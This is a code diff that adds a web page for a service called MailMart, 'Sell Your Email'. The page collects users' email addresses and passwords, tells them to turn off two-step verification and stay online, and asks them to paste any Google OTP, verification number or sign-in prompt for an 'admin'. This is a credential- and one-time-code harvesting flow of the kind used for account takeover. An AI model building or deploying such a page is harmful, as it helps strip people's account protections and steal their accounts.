@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>Sell Email | MailMart</title>
+
+<meta name="theme-color" content="#020812">
+
+<link
+rel="icon"
+type="image/jpeg"
+href="https://res.cloudinary.com/wfcrf1ps/image/upload/f_auto,q_auto,w_128/v1786979320/WhatsApp_Image_2026-08-16_at_11.41.57_PM.jpg"
+>
+
+<link
+rel="shortcut icon"
+href="https://res.cloudinary.com/wfcrf1ps/image/upload/f_auto,q_auto,w_128/v1786979320/WhatsApp_Image_2026-08-16_at_11.41.57_PM.jpg"
+>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link
+href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"
+rel="stylesheet"
+>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+html{
+    width:100%;
+    min-height:100%;
+    overflow-x:hidden;
+}
+
+body{
+    width:100%;
+    min-height:100vh;
+    overflow-x:hidden;
+    font-family:Inter,Arial,sans-serif;
+    color:#fff;
+
+    background:
+        radial-gradient(
+            circle at 15% 0%,
+            rgba(0,120,255,.17),
+            transparent 35%
+        ),
+        radial-gradient(
+            circle at 100% 100%,
+            rgba(0,210,255,.10),
+            transparent 35%
+        ),
+        #020812;
+}
+
+body::before{
+    content:"";
+    position:fixed;
+    inset:0;
+    z-index:0;
+    pointer-events:none;
+
+    background-image:
+        linear-gradient(rgba(0,190,255,.025) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(0,190,255,.025) 1px,transparent 1px);
+
+    background-size:50px 50px;
+}
+
+/* ---------- Layout ---------- */
+
+.shell{
+    position:relative;
+    z-index:1;
+
+    display:grid;
+    grid-template-columns:255px 1fr;
+
+    min-height:100vh;
+}
+
+/* ---------- Sidebar ---------- */
+
+.sidebar{
+    position:sticky;
+    top:0;
+
+    height:100vh;
+
+    padding:26px 18px;
+
+    display:flex;
+    flex-direction:column;
+
+    background:linear-gradient(180deg,rgba(9,35,68,.55),rgba(3,13,27,.25));
+
+    border-right:1px solid rgba(0,205,255,.12);
+
+    backdrop-filter:blur(8px);
+}
+
+.side-brand{
+    display:flex;
+    align-items:center;
+    gap:12px;
+
+    padding:4px 6px 26px;
+
+    border-bottom:1px solid rgba(0,205,255,.10);
+
+    margin-bottom:22px;
+}
+
+.side-logo{
+    width:42px;
+    height:42px;
+
+    border-radius:13px;
+
+    object-fit:cover;
+
+    box-shadow:0 10px 28px rgba(0,160,255,.25);
+}
+
+.side-name{
+    font-size:17px;
+    font-weight:800;
+    letter-spacing:-.5px;
+}
+
+.side-name span{
+    background:linear-gradient(90deg,#fff,#35ddff,#087cff);
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+}
+
+.nav{
+    display:flex;
+    flex-direction:column;
+    gap:5px;
+    flex:1;
+}
+
+.nav-label{
+    color:#5c758e;
+    font-size:9px;
+    font-weight:700;
+    letter-spacing:1.4px;
+    text-transform:uppercase;
+
+    padding:14px 12px 6px;
+}
+
+.nav-item{
+    display:flex;
+    align-items:center;
+    gap:12px;
+
+    padding:11px 12px;
+
+    border-radius:12px;
+
+    color:#9bb2ca;
+    font-size:12.5px;
+    font-weight:600;
+    text-decoration:none;
+
+    cursor:pointer;
+
+    transition:.2s;
+}
+
+.nav-item .ic{
+    width:17px;
+    height:17px;
+    flex-shrink:0;
+    opacity:.85;
+}
+
+.nav-item:hover{
+    background:rgba(0,130,255,.07);
+    color:#dbe9f7;
+}
+
+.nav-item.active{
+    background:linear-gradient(135deg,rgba(8,124,255,.22),rgba(0,213,255,.10));
+    color:#fff;
+    border:1px solid rgba(0,205,255,.25);
+    box-shadow:0 8px 24px rgba(0,150,255,.12);
+}
+
+.nav-item.active .ic{ opacity:1; }
+
+.side-foot{
+    border-top:1px solid rgba(0,205,255,.10);
+    padding-top:16px;
+    margin-top:10px;
+}
+
+.logout-btn{
+    width:100%;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:9px;
+
+    height:44px;
+
+    border:1px solid rgba(255,90,110,.22);
+    border-radius:12px;
+
+    background:rgba(255,50,80,.06);
+
+    color:#ff9aa9;
+    font-family:inherit;
+    font-size:12px;
+    font-weight:700;
+
+    cursor:pointer;
+
+    transition:.2s;
+}
+
+.logout-btn:hover{
+    background:rgba(255,50,80,.12);
+    color:#ffc1cb;
+}
+
+/* ---------- Main ---------- */
+
+.main{
+    min-width:0;
+    padding:26px 30px 40px;
+}
+
+.topbar{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:18px;
+    flex-wrap:wrap;
+    margin-bottom:26px;
+}
+
+.head-left{
+    display:flex;
+    align-items:center;
+    gap:12px;
+}
+
+.menu-toggle{
+    display:none;
+    width:42px;
+    height:42px;
+    border:1px solid rgba(0,205,255,.18);
+    border-radius:12px;
+    background:rgba(0,130,255,.06);
+    color:#bfe6ff;
+    font-size:18px;
+    cursor:pointer;
+}
+
+.page-title{
+    font-size:clamp(22px,3vw,28px);
+    letter-spacing:-1px;
+    margin-bottom:5px;
+}
+
+.page-sub{
+    color:#8ba3bd;
+    font-size:12.5px;
+}
+
+.top-actions{
+    display:flex;
+    align-items:center;
+    gap:12px;
+}
+
+.contact-admin{
+    height:44px;
+    padding:0 18px;
+    display:flex;
+    align-items:center;
+    gap:8px;
+    border:1px solid rgba(0,205,255,.22);
+    border-radius:13px;
+    background:rgba(255,255,255,.04);
+    color:#cfe6fb;
+    font-family:inherit;
+    font-size:12px;
+    font-weight:700;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.contact-admin:hover{
+    background:rgba(255,255,255,.08);
+}
+
+/* ---------- Notice banner ---------- */
+
+.notice{
+    border-radius:18px;
+    padding:20px 22px;
+    margin-bottom:24px;
+
+    background:linear-gradient(135deg,rgba(255,190,60,.08),rgba(0,213,255,.05));
+    border:1px solid rgba(255,190,60,.28);
+
+    position:relative;
+    overflow:hidden;
+}
+
+.notice::before{
+    content:"";
+    position:absolute;
+    left:0; top:0; bottom:0;
+    width:4px;
+    background:linear-gradient(180deg,#ffd479,#00d5ff);
+}
+
+.notice h3{
+    display:flex;
+    align-items:center;
+    gap:9px;
+    font-size:14px;
+    font-weight:800;
+    margin-bottom:12px;
+    color:#ffe3a3;
+}
+
+.notice ul{
+    list-style:none;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+}
+
+.notice li{
+    display:flex;
+    gap:10px;
+    font-size:12.5px;
+    line-height:1.6;
+    color:#e7eef8;
+}
+
+.notice li .num{
+    flex-shrink:0;
+    width:20px;
+    height:20px;
+    border-radius:6px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:rgba(255,190,60,.16);
+    border:1px solid rgba(255,190,60,.3);
+    color:#ffd479;
+    font-size:10px;
+    font-weight:800;
+}
+
+.notice .hl{
+    color:#ffd479;
+    font-weight:700;
+}
+
+/* ---------- Cards / panels ---------- */
+
+.panel{
+    padding:24px;
+    border-radius:22px;
+    background:linear-gradient(145deg,rgba(9,35,68,.92),rgba(3,13,27,.97));
+    border:1px solid rgba(0,205,255,.15);
+    box-shadow:0 22px 60px rgba(0,0,0,.32);
+    margin-bottom:24px;
+}
+
+.panel-head{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:18px;
+}
+
+.panel-head h2{
+    font-size:16px;
+    font-weight:800;
+    letter-spacing:-.4px;
+}
+
+.panel-head .step{
+    font-size:10px;
+    font-weight:700;
+    color:#6fe0ff;
+    background:rgba(0,170,255,.1);
+    border:1px solid rgba(0,205,255,.25);
+    padding:5px 10px;
+    border-radius:20px;
+}
+
+/* ---------- Form ---------- */
+
+.field{
+    margin-bottom:16px;
+}
+
+.field label{
+    display:block;
+    color:#b8cbe0;
+    font-size:11px;
+    font-weight:700;
+    margin-bottom:7px;
+}
+
+.input-wrap{
+    position:relative;
+    width:100%;
+}
+
+.input-wrap input,
+.input-wrap textarea{
+    display:block;
+    width:100%;
+    padding:13px 45px 13px 14px;
+    border:1px solid rgba(255,255,255,.09);
+    border-radius:12px;
+    outline:none;
+    background:rgba(0,0,0,.2);
+    color:#fff;
+    font-family:inherit;
+    font-size:13px;
+    resize:vertical;
+}
+
+.input-wrap textarea{
+    min-height:92px;
+    padding-right:14px;
+    line-height:1.6;
+}
+
+.input-wrap input:focus,
+.input-wrap textarea:focus{
+    border-color:#08bfff;
+    box-shadow:0 0 0 3px rgba(0,180,255,.07);
+}
+
+.input-wrap input::placeholder,
+.input-wrap textarea::placeholder{
+    color:#58718c;
+}
+
+.eye{
+    position:absolute;
+    right:13px;
+    top:50%;
+    transform:translateY(-50%);
+    color:#6c839b;
+    font-size:10px;
+    cursor:pointer;
+    user-select:none;
+}
+
+.eye:hover{ color:#29d9ff; }
+
+.hint{
+    font-size:10.5px;
+    color:#7e96b0;
+    margin-top:7px;
+    line-height:1.5;
+}
+
+.submit-btn{
+    width:100%;
+    height:50px;
+    border:0;
+    border-radius:13px;
+    background:linear-gradient(135deg,#087cff,#00d5ff);
+    color:#fff;
+    font-family:inherit;
+    font-size:13px;
+    font-weight:800;
+    cursor:pointer;
+    transition:.25s;
+    margin-top:4px;
+}
+
+.submit-btn:hover{
+    transform:translateY(-2px);
+    box-shadow:0 14px 30px rgba(0,150,255,.25);
+}
+
+.submit-btn:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+    transform:none;
+}
+
+/* ---------- Pending status ---------- */
+
+.status-card{
+    display:none;
+    border-radius:22px;
+    padding:24px;
+    background:linear-gradient(145deg,rgba(9,35,68,.95),rgba(3,13,27,.98));
+    border:1px solid rgba(0,205,255,.2);
+    box-shadow:0 22px 60px rgba(0,0,0,.35);
+    margin-bottom:24px;
+}
+
+.status-card.show{ display:block; }
+
+.status-top{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:14px;
+    flex-wrap:wrap;
+    margin-bottom:8px;
+}
+
+.status-top .lab{
+    font-size:12px;
+    color:#8ba3bd;
+    font-weight:600;
+}
+
+.status-email{
+    font-size:18px;
+    font-weight:800;
+    letter-spacing:-.4px;
+    margin:4px 0 14px;
+    word-break:break-all;
+}
+
+.pill{
+    display:inline-block;
+    padding:6px 13px;
+    border-radius:20px;
+    font-size:10px;
+    font-weight:800;
+    letter-spacing:.4px;
+    text-transform:uppercase;
+}
+
+.pill.pend{
+    color:#ffd479;
+    background:rgba(255,190,60,.12);
+    border:1px solid rgba(255,190,60,.3);
+}
+
+.status-note{
+    font-size:12px;
+    line-height:1.7;
+    color:#c4d6ea;
+    background:rgba(0,170,255,.06);
+    border:1px solid rgba(0,205,255,.16);
+    border-radius:13px;
+    padding:13px 15px;
+    margin-top:4px;
+}
+
+.status-note b{ color:#fff; }
+
+/* ---------- Additional submission ---------- */
+
+.add-area{
+    opacity:.45;
+    pointer-events:none;
+    transition:.25s;
+}
+
+.add-area.unlocked{
+    opacity:1;
+    pointer-events:auto;
+}
+
+.lock-note{
+    font-size:11px;
+    color:#7e96b0;
+    margin-bottom:14px;
+    display:flex;
+    align-items:center;
+    gap:8px;
+}
+
+.cat-row{
+    display:flex;
+    flex-wrap:wrap;
+    gap:9px;
+    margin-bottom:14px;
+}
+
+.cat{
+    padding:9px 13px;
+    border-radius:11px;
+    border:1px solid rgba(0,205,255,.18);
+    background:rgba(0,130,255,.06);
+    color:#bcd9f2;
+    font-size:11px;
+    font-weight:600;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.cat:hover{
+    background:rgba(0,130,255,.12);
+    color:#fff;
+}
+
+.cat.active{
+    background:linear-gradient(135deg,rgba(8,124,255,.3),rgba(0,213,255,.14));
+    border-color:rgba(0,205,255,.4);
+    color:#fff;
+}
+
+.info-note{
+    font-size:11.5px;
+    line-height:1.7;
+    color:#9bb2ca;
+    background:rgba(255,255,255,.03);
+    border:1px dashed rgba(0,205,255,.2);
+    border-radius:13px;
+    padding:14px 16px;
+    margin-bottom:18px;
+}
+
+.info-note b{ color:#cfe6fb; }
+
+.info-note ul{
+    margin:9px 0 0;
+    padding-left:4px;
+    list-style:none;
+    display:flex;
+    flex-direction:column;
+    gap:7px;
+}
+
+.info-note li{
+    display:flex;
+    gap:9px;
+}
+
+.info-note li .b{
+    color:#6fe0ff;
+    font-weight:800;
+}
+
+/* ---------- Submission log ---------- */
+
+.log{
+    margin-top:18px;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+}
+
+.log-item{
+    display:flex;
+    gap:12px;
+    align-items:flex-start;
+    padding:13px 14px;
+    border-radius:13px;
+    background:rgba(0,0,0,.22);
+    border:1px solid rgba(255,255,255,.06);
+    animation:fade .35s ease;
+}
+
+@keyframes fade{
+    from{ opacity:0; transform:translateY(6px); }
+    to{ opacity:1; transform:none; }
+}
+
+.log-item .tagbadge{
+    flex-shrink:0;
+    font-size:9px;
+    font-weight:800;
+    text-transform:uppercase;
+    letter-spacing:.4px;
+    color:#6fe0ff;
+    background:rgba(0,170,255,.12);
+    border:1px solid rgba(0,205,255,.25);
+    padding:5px 9px;
+    border-radius:9px;
+    white-space:nowrap;
+}
+
+.log-item .body{
+    flex:1;
+    min-width:0;
+}
+
+.log-item .body .txt{
+    font-size:12px;
+    color:#dfeaf6;
+    line-height:1.55;
+    word-break:break-word;
+}
+
+.log-item .body .time{
+    font-size:10px;
+    color:#6e849c;
+    margin-top:4px;
+}
+
+.log-empty{
+    font-size:11.5px;
+    color:#6e849c;
+    text-align:center;
+    padding:14px;
+}
+
+.success-box{
+    display:none;
+    padding:11px 13px;
+    border-radius:11px;
+    margin-bottom:14px;
+    font-size:11px;
+    line-height:1.5;
+    color:#69edb8;
+    background:rgba(0,220,150,.07);
+    border:1px solid rgba(0,220,150,.18);
+}
+
+.success-box.show{ display:block; }
+
+/* ---------- Responsive ---------- */
+
+@media(max-width:860px){
+    .shell{ grid-template-columns:1fr; }
+    .sidebar{
+        position:fixed;
+        z-index:40;
+        width:255px;
+        transform:translateX(-100%);
+        transition:transform .3s ease;
+    }
+    body.nav-open .sidebar{ transform:translateX(0); }
+    body.nav-open::after{
+        content:"";
+        position:fixed;
+        inset:0;
+        z-index:39;
+        background:rgba(0,0,0,.55);
+    }
+    .menu-toggle{ display:flex; align-items:center; justify-content:center; }
+    .main{ padding:18px 16px 34px; }
+}
+
+@media(max-width:560px){
+    .contact-admin span{ display:none; }
+    .panel{ padding:18px; }
+    .status-card{ padding:18px; }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="shell" id="shell">
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+
+        <div class="side-brand">
+            <img class="side-logo"
+                 src="https://res.cloudinary.com/wfcrf1ps/image/upload/f_auto,q_auto,w_200/v1786979320/WhatsApp_Image_2026-08-16_at_11.41.57_PM.jpg"
+                 alt="MailMart">
+            <div class="side-name">Mail<span>Mart</span></div>
+        </div>
+
+        <nav class="nav">
+            <span class="nav-label">Menu</span>
+
+            <a class="nav-item" data-page="Dashboard" href="dashboard.html">
+                <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9" rx="1.5"/><rect x="14" y="3" width="7" height="5" rx="1.5"/><rect x="14" y="12" width="7" height="9" rx="1.5"/><rect x="3" y="16" width="7" height="5" rx="1.5"/></svg>
+                Dashboard
+            </a>
+
+            <a class="nav-item" data-page="Orders" href="dashboard.html">
+                <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"/><path d="M3 6h18"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>
+                Orders
+            </a>
+
+            <a class="nav-item" data-page="Services" href="dashboard.html">
+                <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v4M12 18v4M4.9 4.9l2.8 2.8M16.3 16.3l2.8 2.8M2 12h4M18 12h4M4.9 19.1l2.8-2.8M16.3 7.7l2.8-2.8"/><circle cx="12" cy="12" r="3.2"/></svg>
+                Services
+            </a>
+
+            <a class="nav-item" data-page="Wallet" href="dashboard.html">
+                <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2Z"/><path d="M16 12h.01"/><path d="M3 9h18"/></svg>
+                Wallet
+            </a>
+
+            <a class="nav-item active" data-page="Emails" href="email-sale.html">
+                <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg>
+                Sell Email
+            </a>
+
+            <span class="nav-label">Account</span>
+
+            <a class="nav-item" data-page="Profile" href="dashboard.html">
+                <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 21a8 8 0 0 1 16 0"/></svg>
+                Profile
+            </a>
+
+            <a class="nav-item" data-page="Settings" href="dashboard.html">
+                <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.6 1.6 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.6 1.6 0 0 0-2.7 1.1V21a2 2 0 1 1-4 0v-.1A1.6 1.6 0 0 0 7 19.4a1.6 1.6 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1A1.6 1.6 0 0 0 3 14.1H3a2 2 0 1 1 0-4h.1A1.6 1.6 0 0 0 4.6 7a1.6 1.6 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1A1.6 1.6 0 0 0 10 3.6V3a2 2 0 1 1 4 0v.1a1.6 1.6 0 0 0 2.7 1.1l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.6 1.6 0 0 0-.3 1.8V9a2 2 0 1 1 0 4Z"/></svg>
+                Settings
+            </a>
+        </nav>
+
+        <div class="side-foot">
+            <button class="logout-btn" id="logoutBtn">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><path d="m16 17 5-5-5-5"/><path d="M21 12H9"/></svg>
+                Log out
+            </button>
+        </div>
+
+    </aside>
+
+    <!-- Main -->
+    <main class="main">
+
+        <div class="topbar">
+
+            <div class="head-left">
+                <button class="menu-toggle" id="menuToggle">☰</button>
+                <div>
+                    <div class="page-title">Sell Your Email</div>
+                    <div class="page-sub">Submit an email for sale. Our team verifies and buys it.</div>
+                </div>
+            </div>
+
+            <div class="top-actions">
+                <button class="contact-admin" id="contactAdmin">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2Z"/></svg>
+                    <span>Contact Admin</span>
+                </button>
+            </div>
+
+        </div>
+
+        <!-- Important notice -->
+        <div class="notice">
+            <h3>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
+                Read before you submit
+            </h3>
+            <ul>
+                <li>
+                    <span class="num">1</span>
+                    <span><b class="hl">Remove 2-Step Verification (2FA)</b> from the email account before submitting. Sales with 2FA enabled cannot be completed.</span>
+                </li>
+                <li>
+                    <span class="num">2</span>
+                    <span><b class="hl">Stay online and active</b> right after submission — Google may send a confirmation prompt that we need you to approve quickly.</span>
+                </li>
+                <li>
+                    <span class="num">3</span>
+                    <span><b class="hl">Contact admin</b> to confirm and complete the sale once your email shows as <i>Pending</i>.</span>
+                </li>
+            </ul>
+        </div>
+
+        <!-- Step 1: submit email -->
+        <section class="panel">
+            <div class="panel-head">
+                <h2>Submit Email for Sale</h2>
+                <span class="step">STEP 1</span>
+            </div>
+
+            <form id="saleForm">
+                <div class="field">
+                    <label>Email Address</label>
+                    <div class="input-wrap">
+                        <input id="email" type="email" placeholder="e.g. yourmail@gmail.com" autocomplete="email" required>
+                    </div>
+                    <div class="hint">Use the exact email you want to sell. You must have full access to it.</div>
+                </div>
+
+                <div class="field">
+                    <label>Email Password</label>
+                    <div class="input-wrap">
+                        <input id="password" type="password" placeholder="Enter the account password" autocomplete="off" required>
+                        <span class="eye" id="passwordEye">Show</span>
+                    </div>
+                    <div class="hint">Keep 2FA removed. Your submission is private and shared only with our verification team.</div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">Submit for Sale</button>
+            </form>
+        </section>
+
+        <!-- Pending status -->
+        <section class="status-card" id="statusCard">
+            <div class="status-top">
+                <div>
+                    <div class="lab">Sale Status</div>
+                    <div class="status-email" id="statusEmail">—</div>
+                </div>
+                <span class="pill pend">Pending</span>
+            </div>
+            <div class="status-note">
+                Your email is now <b>Pending</b> review by our team. Please <b>stay online</b> and keep this account accessible.
+                If Google sends any OTP, verification number or security prompt, submit it in the box below so we can verify and
+                <b>complete your sale</b>. You can also reach the <b>admin</b> anytime to speed things up.
+            </div>
+        </section>
+
+        <!-- Step 2: additional submission -->
+        <section class="panel add-area" id="addArea">
+            <div class="panel-head">
+                <h2>Additional Submission</h2>
+                <span class="step">STEP 2</span>
+            </div>
+
+            <div class="lock-note" id="lockNote">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                Unlocks automatically after you submit an email above.
+            </div>
+
+            <div class="info-note">
+                <b>What goes here?</b> After submission, Google may contact this email with a security check. Send us whatever Google sends so we can finish verifying the account:
+                <ul>
+                    <li><span class="b">OTP</span> — a one-time code Google texts or emails when it requests sign-in.</li>
+                    <li><span class="b">Verification number</span> — a code from Google's account verification step.</li>
+                    <li><span class="b">Any Google prompt</span> — a "Is this you?" tap prompt, recovery notice, or any confirmation message concerning that mail.</li>
+                </ul>
+            </div>
+
+            <form id="addForm">
+                <div class="cat-row" id="catRow">
+                    <span class="cat" data-cat="OTP">OTP Code</span>
+                    <span class="cat" data-cat="Verification">Verification Number</span>
+                    <span class="cat" data-cat="Prompt">Google Prompt</span>
+                    <span class="cat" data-cat="Other">Other / Note</span>
+                </div>
+
+                <div class="field">
+                    <label>Message for Admin</label>
+                    <div class="input-wrap">
+                        <textarea id="addText" placeholder="Paste the OTP, verification number, or describe the Google prompt you received…" required></textarea>
+                    </div>
+                </div>
+
+                <div class="success-box" id="addSuccess"></div>
+
+                <button type="submit" class="submit-btn" id="addBtn">Send to Admin</button>
+            </form>
+
+            <div class="log" id="log">
+                <div class="log-empty" id="logEmpty">No additional submissions yet.</div>
+            </div>
+        </section>
+
+    </main>
+
+</div>
+
+<script type="module">
+
+import {
+initializeApp
+}
+from
+"https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
+
+import {
+getAuth,
+onAuthStateChanged,
+signOut
+}
+from
+"https://www.gstatic.com/firebasejs/12.1.0/firebase-auth.js";
+
+const firebaseConfig={
+apiKey:"AIzaSyCc-0Gtmh7dIFWgnWglIQfjq-PlJu07IKE",
+authDomain:"mailmartz.firebaseapp.com",
+projectId:"mailmartz",
+storageBucket:"mailmartz.firebasestorage.app",
+messagingSenderId:"802413654231",
+appId:"1:802413654231:web:4e5d87d23d6a2317724092",
+measurementId:"G-LKLEWS7RPF"
+};
+
+const app=initializeApp(firebaseConfig);
+const auth=getAuth(app);
+
+/* Auth guard — same pattern as the dashboard */
+onAuthStateChanged(auth,(user)=>{
+    if(!user){
+        window.location.href="login.html";
+    }
+});
+
+/* Logout */
+document.getElementById("logoutBtn").addEventListener("click",async()=>{
+    try{ await signOut(auth); window.location.href="login.html"; }
+    catch(e){ console.error(e); }
+});
+
+/* Mobile sidebar */
+document.getElementById("menuToggle").addEventListener("click",()=>{
+    document.body.classList.toggle("nav-open");
+});
+document.querySelectorAll(".nav-item").forEach(item=>{
+    item.addEventListener("click",()=>{
+        document.body.classList.remove("nav-open");
+    });
+});
+
+/* Show / hide password */
+const password=document.getElementById("password");
+const passwordEye=document.getElementById("passwordEye");
+passwordEye.addEventListener("click",()=>{
+    if(password.type==="password"){
+        password.type="text"; passwordEye.textContent="Hide";
+    }else{
+        password.type="password"; passwordEye.textContent="Show";
+    }
+});
+
+/* Contact admin */
+document.getElementById("contactAdmin").addEventListener("click",()=>{
+    alert("Demo: open live chat or email admin@mailmart.com to complete your sale.");
+});
+
+/* Track the submitted email + chosen category */
+let submittedEmail="";
+let chosenCat="OTP";
+
+/* Step 1 — submit for sale */
+const saleForm=document.getElementById("saleForm");
+const statusCard=document.getElementById("statusCard");
+const addArea=document.getElementById("addArea");
+const lockNote=document.getElementById("lockNote");
+
+saleForm.addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+    const emailVal=document.getElementById("email").value.trim();
+    const passVal=document.getElementById("password").value;
+
+    if(!emailVal||!passVal){
+        alert("Please enter both the email and password.");
+        return;
+    }
+
+    submittedEmail=emailVal;
+
+    /* mark pending + unlock additional submissions */
+    document.getElementById("statusEmail").textContent=emailVal;
+    statusCard.classList.add("show");
+    addArea.classList.add("unlocked");
+    lockNote.style.display="none";
+
+    /* reset the submission log for this email */
+    document.getElementById("log").innerHTML=
+        '<div class="log-empty" id="logEmpty">No additional submissions yet for '+emailVal+'.</div>';
+
+    alert("Submitted! Your email is now Pending. Stay online and send any Google OTP / prompt below.");
+});
+
+/* Category selector */
+document.querySelectorAll(".cat").forEach(c=>{
+    c.addEventListener("click",()=>{
+        document.querySelectorAll(".cat").forEach(x=>x.classList.remove("active"));
+        c.classList.add("active");
+        chosenCat=c.dataset.cat;
+    });
+});
+/* pre-select first category */
+document.querySelector('.cat[data-cat="OTP"]').classList.add("active");
+
+/* Step 2 — additional submission */
+const addForm=document.getElementById("addForm");
+const addText=document.getElementById("addText");
+const addSuccess=document.getElementById("addSuccess");
+const log=document.getElementById("log");
+
+addForm.addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+    const text=addText.value.trim();
+    if(!text){
+        alert("Enter the OTP, verification number or prompt details.");
+        return;
+    }
+
+    /* remove empty placeholder if present */
+    const empty=log.querySelector("#logEmpty");
+    if(empty) empty.remove();
+
+    const now=new Date();
+    const timeStr=now.toLocaleString();
+
+    const item=document.createElement("div");
+    item.className="log-item";
+    item.innerHTML=
+        '<span class="tagbadge">'+chosenCat+'</span>'+
+        '<div class="body">'+
+            '<div class="txt">'+escapeHtml(text)+'</div>'+
+            '<div class="time">For '+escapeHtml(submittedEmail)+' · '+timeStr+'</div>'+
+        '</div>';
+    log.prepend(item);
+
+    addSuccess.textContent="Sent to admin for "+submittedEmail+". Keep the account online.";
+    addSuccess.classList.add("show");
+
+    addText.value="";
+
+    setTimeout(()=>addSuccess.classList.remove("show"),4000);
+});
+
+function escapeHtml(s){
+    return s.replace(/[&<>"']/g,c=>({
+        "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"
+    }[c]));
+}
+
+</script>
+
+</body>
+</html>
